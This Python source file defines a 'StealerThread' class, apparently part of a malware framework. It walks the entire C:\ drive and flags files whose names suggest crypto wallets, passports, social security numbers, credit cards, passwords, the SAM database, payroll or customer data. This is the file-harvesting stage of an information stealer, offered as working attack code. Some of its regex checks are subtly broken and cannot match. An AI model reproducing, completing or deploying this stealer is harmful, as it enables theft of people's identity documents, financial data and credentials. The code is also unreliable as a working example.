import threading
import os
import re
import time
from core import *

# An example of how attackers can simply search machines for
# the content they are looking for
class StealerThread(threading.Thread):
	# Constuctor for the stealer
	def __init__(self):
		threading.Thread.__init__(self)
		debug("stealer", "Initialized")
	def run(self):
			global MarkedFiles
			genericSearchTerms = ["marriagelicense", "driverslicense", "socialsecuritynumber", "creditcard", "passport", "wallet", "licensekey", "password", "credithistory", "SAM", "account", "private", "0day"]
			businessSearchTerms = ["employee", "expensereport", "payroll", "taxes", "customerdata"]
			trigger = False # set to true if file is a go
			for dirname, subdirs, filelist in os.walk("C:\\"):
				for filename in filelist:
					nameArray = filename.split('.')
					if (filename == "wallet.dat"):
						trigger = True
					# Finding interesting stuff
					for i in filename.split('.'):
						if re.match('\.tax20[0-1][0-9]', i) is not None:
							trigger = True
						# excel files
						if re.match('\.xslx', i) is not None:
							for b in businessSearchTerms:
								if b in i:
									trigger = True
						for x in genericSearchTerms:
							if x in i:
								trigger = True
						time.sleep(0.005)
					if (trigger):
						unique = checkUnique(filename)
						if (unique):
							MarkedFiles.append([filename, dirname])
						trigger = False
